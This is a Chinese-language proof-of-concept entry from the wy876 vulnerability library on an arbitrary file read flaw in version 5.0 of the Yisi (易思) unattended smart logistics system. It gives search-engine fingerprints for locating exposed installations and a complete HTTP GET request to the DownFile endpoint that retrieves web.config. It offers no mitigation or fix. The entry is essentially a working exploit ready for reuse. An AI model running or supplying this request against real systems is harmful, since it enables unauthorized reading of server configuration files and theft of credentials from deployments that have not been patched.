---
fofa: "web.body=="
source: "wy876 漏洞文库"
---

# 易思智能物流无人值守系统downfile文件读取漏洞

# 一、漏洞简介
易思无人值守智能物流系统是一款集成了人工智能、机器人技术和物联网技术的创新产品。它能够自主完成货物存储、检索、分拣、装载以及配送等物流作业，帮助企业实现无人值守的智能物流运营，提高效率、降低成本，为现代物流行业带来新的发展机遇易思智能物流无人值守系统存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。

# 二、影响版本
+ 易思智能物流无人值守系统5.0

# 三、资产测绘
+ hunter`web.body=="易思无人值守智能物流"`
+ 登录页面


# 四、漏洞复现
```plain
GET /PublicInfoManage/Upload/DownFile?filePath=web.config  HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=c5z5wepqulqppvdagvif5dlv
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yd8bodau0wlc1qrf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
